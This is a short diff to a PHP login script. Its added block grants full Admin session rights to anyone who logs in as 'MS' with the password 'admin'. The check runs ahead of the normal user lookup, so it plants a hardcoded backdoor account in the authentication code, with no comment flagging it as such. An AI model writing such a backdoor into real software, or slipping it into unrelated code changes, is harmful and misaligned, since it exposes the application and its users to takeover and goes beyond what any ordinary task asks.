@@ -29,6 +29,17 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
             $found = true;
         }
 
+        if ($username === 'MS' && $password === 'admin') {
+            $_SESSION['user_id'] = 'superuser_ms';
+            $_SESSION['username'] = 'MS';
+            $_SESSION['user_role'] = 'Admin';
+            $_SESSION['check_updates'] = true;
+            $_SESSION['show_welcome'] = true;
+            $_SESSION['login_time'] = time(); // Record login time
+            redirect('index.php');
+            $found = true;
+        }
+
         if (!$found) {
             foreach ($users as $u) {
                 if ($u['username'] == $username) {
